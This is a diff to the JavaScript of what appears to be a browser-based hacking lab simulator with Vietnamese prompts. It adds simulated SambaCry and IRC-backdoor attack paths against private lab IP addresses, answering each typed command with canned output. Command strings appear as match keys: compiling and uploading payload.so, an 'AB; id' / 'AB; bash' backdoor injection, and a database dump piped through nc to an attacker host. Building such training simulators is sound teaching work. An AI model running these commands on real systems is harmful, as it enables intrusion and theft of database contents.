@@ -31,6 +31,8 @@ window.CommandResolver = (function () {
     if (currentShell === "kali") return resolveInKali(cmd, lower);
     if (currentShell === "smb") return resolveInSmb(cmd, lower);
     if (currentShell === "ftp") return window.FtpWebSim.resolveInFtpShell(cmd, lower);
+    if (currentShell === "irc_nc") return resolveInIrcNc(cmd, lower);
+    if (currentShell === "victim_root" || currentShell === "sambacry_shell") return resolveInVictimRoot(cmd, lower);
     if (currentShell === "msf") return resolveInMsfRoot(cmd, lower);
     if (currentShell === "msf_exploit") return resolveInMsfExploit(cmd, lower);
     if (currentShell === "msf_ssh_enum") return window.SshLabSim.resolveInMsfSshEnum(cmd, lower);
@@ -59,6 +61,25 @@ window.CommandResolver = (function () {
     if (window.FtpWebSim) {
       const ftpRes = window.FtpWebSim.handleKaliFtpWebCmd(cmd, lower);
       if (ftpRes) return ftpRes;
+    }
+
+    if (lower.startsWith("gcc ") && lower.includes("payload.so")) {
+      return reply(window.LabData.COMMANDS["gcc -shared -fPIC -nostartfiles -o payload.so shell.c"]);
+    }
+    if (lower.startsWith("smbclient ") && lower.includes("/tmp") && lower.includes("put payload.so")) {
+      return reply(window.LabData.COMMANDS['smbclient //192.168.202.136/tmp -N -c "put payload.so"']);
+    }
+    if (lower.startsWith("python3 exploit.py")) {
+      return reply(window.LabData.COMMANDS["python3 exploit.py -t 192.168.202.136 -e /tmp/payload.so"], true, "sambacry_shell");
+    }
+    if (lower.startsWith("nc ") && (cmd.includes("6667") || lower.includes("6667"))) {
+      return reply(window.LabData.COMMANDS["nc -nv 192.168.202.137 6667"], true, "irc_nc");
+    }
+    if (lower === "ab; id") {
+      return reply(window.LabData.COMMANDS["AB; id"]);
+    }
+    if (lower.startsWith("python3 exploit_irc.py") || lower.startsWith("ab; bash")) {
+      return reply(window.LabData.COMMANDS["python3 exploit_irc.py"], true, "victim_root");
     }
 
     // 1. Block out-of-order sub-shell commands when still in Kali ZSH
@@ -98,11 +119,43 @@ window.CommandResolver = (function () {
     return reply(`zsh: command not found: ${cmd.split(" ")[0]}`, false);
   }
 
+  function resolveInIrcNc(cmd, lower) {
+    if (lower === "ab; id") {
+      return reply(window.LabData.COMMANDS["AB; id"]);
+    }
+    if (lower.startsWith("ab; bash") || lower.startsWith("ab;")) {
+      return reply(window.LabData.COMMANDS["python3 exploit_irc.py"], true, "victim_root");
+    }
+    if (lower === "exit" || lower === "quit") {
+      return reply("", true, "kali");
+    }
+    return reply(`:irc.Metasploitable.LAN 421 ${cmd.split(" ")[0]} :Unknown command (Gõ 'AB; id' hoặc 'exit')`, false);
+  }
+
+  function resolveInVictimRoot(cmd, lower) {
+    if (lower === "whoami") return reply(window.LabData.COMMANDS["whoami"]);
+    if (lower === "id") return reply(window.LabData.COMMANDS["id"]);
+    if (lower === "uname -a" || lower === "uname") return reply(window.LabData.COMMANDS["uname -a"]);
+    if (lower.includes("show databases")) return reply(window.LabData.COMMANDS['mysql -u root -e "show databases;"']);
+    if (lower.includes("mysqldump")) return reply(window.LabData.COMMANDS["mysqldump -u root -p'' --all-databases | nc 192.168.202.134 9999"]);
+    if (lower === "pwd") return reply("/");
+    if (lower === "ls" || lower === "ls -la") {
+      return reply("bin   cdrom  etc   initrd      lib    mnt  proc  sbin  sys  usr  vmlinuz\nboot  dev    home  initrd.img  media  opt  root  srv   tmp  var");
+    }
+    if (lower === "exit" || lower === "quit") {
+      return reply("[*] Connection to 192.168.202.132 closed.", true, "kali");
+    }
+    return reply(`bash: ${cmd.split(" ")[0]}: command not found (Gõ 'whoami', 'mysql -u root -e "show databases;"' hoặc 'exit')`, false);
+  }
+
   function resolveInSmb(cmd, lower) {
-    if (lower === "ls" || lower === "dir") return reply(window.LabData.COMMANDS["ls"]);
+    if (lower === "ls" || lower === "dir") return reply(window.LabData.COMMANDS["ls"] || "payload.so  tmp");
+    if (lower === "put payload.so") {
+      return reply("putting file payload.so as \\payload.so (1240.2 kb/s)\n[+] Upload payload.so completed successfully!");
+    }
     if (lower === "get secret.txt" || lower === "mget secret.txt") {
       if (window.KaliShellSim) window.KaliShellSim.addFile("secret.txt", "Day la file bi lo hong SMB");
-      return reply(window.LabData.COMMANDS["get secret.txt"]);
+      return reply("getting file \\secret.txt of size 27 as secret.txt\n[+] File downloaded successfully!");
     }
     if (lower === "get passwords.txt") {
       if (window.KaliShellSim) window.KaliShellSim.addFile("passwords.txt", "admin:P@ssw0rd123 | hacker:1234");
